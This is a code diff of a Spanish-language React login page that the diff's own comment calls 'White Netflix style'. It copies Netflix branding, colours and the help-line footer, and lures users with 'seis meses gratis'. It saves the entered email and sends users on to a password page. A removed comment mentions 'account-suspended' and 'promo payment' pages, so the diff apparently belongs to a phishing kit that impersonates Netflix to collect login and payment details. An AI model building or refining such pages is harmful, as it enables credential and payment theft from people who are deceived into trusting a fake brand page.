@@ -1,6 +1,6 @@
 /**
- * Promo Login - Identical to regular login but for the promo flow
- * After login, redirects to promo payment instead of account-suspended
+ * Promo Login - White Netflix style for the promo flow
+ * After login, redirects to promo password
  */
 
 import PageTransition from "@/components/PageTransition";
@@ -55,29 +55,37 @@ export default function PromoLogin() {
     sessionStorage.setItem("sp_email", email);
     setTimeout(() => {
       setIsLoading(false);
-      setLocation("/promo/password");
+      setLocation("/promo-password");
     }, 1000);
   };
 
   return (
     <PageTransition>
-      <div className="min-h-[100dvh] w-full bg-black flex flex-col">
+      <div className="min-h-[100dvh] w-full bg-white flex flex-col">
         {/* Header */}
-        <header className="w-full px-4 sm:px-8 lg:px-12 pt-4 pb-2 border-b border-[#333]">
-          <BrandLogo height={20} />
+        <header className="w-full px-4 sm:px-8 lg:px-12 py-4 flex items-center justify-between border-b border-[#e6e6e6]">
+          <BrandLogo height={22} />
+          <span className="text-[#333] text-[14px] font-medium cursor-pointer hover:underline">
+            Cerrar sesión
+          </span>
         </header>
 
+        {/* Progress bar */}
+        <div className="w-full h-[3px] bg-[#e6e6e6]">
+          <div className="h-full bg-[#E50914]" style={{ width: '50%' }} />
+        </div>
+
         {/* Main Content */}
-        <main className="flex-1 flex flex-col items-start sm:items-start lg:items-center px-4 sm:px-8 lg:px-12 pt-10 sm:pt-16">
-          <div className="w-full max-w-[400px] lg:max-w-[450px]">
+        <main className="flex-1 flex flex-col items-center px-4 sm:px-8 lg:px-12 pt-10 sm:pt-16">
+          <div className="w-full max-w-[440px]">
             {/* Title */}
-            <h1 className="text-[28px] sm:text-[32px] lg:text-[36px] font-bold text-white mb-2 leading-[1.15]">
-              Ingresa tu info para iniciar sesión
+            <h1 className="text-[26px] sm:text-[32px] font-bold text-[#141414] mb-3 leading-[1.1]">
+              Inicia sesión
             </h1>
 
             {/* Subtitle */}
-            <p className="text-[#8c8c8c] text-[15px] sm:text-[16px] mb-6 sm:mb-8">
-              Inicia sesión para aplicar tu promoción de 6 meses gratis.
+            <p className="text-[16px] text-[#333] mb-6 leading-relaxed">
+              Ingresa tu email o número de celular para aplicar tu promoción de 6 meses gratis.
             </p>
 
             {/* Form */}
@@ -91,8 +99,8 @@ export default function PromoLogin() {
                     setEmail(e.target.value);
                     if (error) setError("");
                   }}
-                  className={`w-full h-[48px] sm:h-[50px] px-4 rounded bg-transparent text-white placeholder:text-[#8c8c8c] text-[15px] sm:text-[16px] outline-none transition-colors border ${
-                    error ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-white"
+                  className={`w-full h-[56px] px-4 rounded-[4px] text-[#141414] placeholder:text-[#737373] text-[16px] outline-none transition-colors border ${
+                    error ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-[#141414]"
                   }`}
                 />
                 {error && (
@@ -109,25 +117,40 @@ export default function PromoLogin() {
               <button
                 type="submit"
                 disabled={isLoading}
-                className="w-full h-[48px] sm:h-[50px] bg-[#E50914] text-white text-[15px] sm:text-[16px] font-bold rounded hover:bg-[#F6121D] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
+                className="w-full h-[56px] bg-[#E50914] text-white text-[18px] sm:text-[22px] font-medium rounded-[4px] hover:bg-[#c11119] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
               >
                 {isLoading ? "Continuando..." : "Continuar"}
               </button>
             </form>
 
             {/* Help Section */}
-            <div className="mt-6 sm:mt-8">
-              <button className="flex items-center gap-1 text-white text-[15px] sm:text-[16px] hover:text-gray-300 transition-colors">
+            <div className="mt-6">
+              <button className="flex items-center gap-1 text-[#333] text-[15px] hover:text-[#141414] transition-colors">
                 <span>Obtener ayuda</span>
                 <ChevronDown size={18} />
               </button>
             </div>
 
-            <p className="text-[#8c8c8c] text-[12px] sm:text-[13px] mt-6 sm:mt-8 leading-relaxed">
+            <p className="text-[#737373] text-[13px] mt-6 leading-relaxed">
               Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
             </p>
           </div>
         </main>
+
+        {/* Footer */}
+        <footer className="w-full bg-[#f3f3f3] px-4 sm:px-8 lg:px-12 py-6 mt-auto">
+          <p className="text-[#737373] text-[13px] mb-4">
+            ¿Preguntas? Llama al 01 800 519 1570 (sin cargo)
+          </p>
+          <div className="grid grid-cols-2 gap-2 text-[13px]">
+            <a href="#" className="text-[#737373] underline">Preguntas frecuentes</a>
+            <a href="#" className="text-[#737373] underline">Centro de ayuda</a>
+            <a href="#" className="text-[#737373] underline">Términos de uso</a>
+            <a href="#" className="text-[#737373] underline">Privacidad</a>
+            <a href="#" className="text-[#737373] underline">Preferencias de cookies</a>
+            <a href="#" className="text-[#737373] underline">Información empresarial</a>
+          </div>
+        </footer>
       </div>
     </PageTransition>
   );
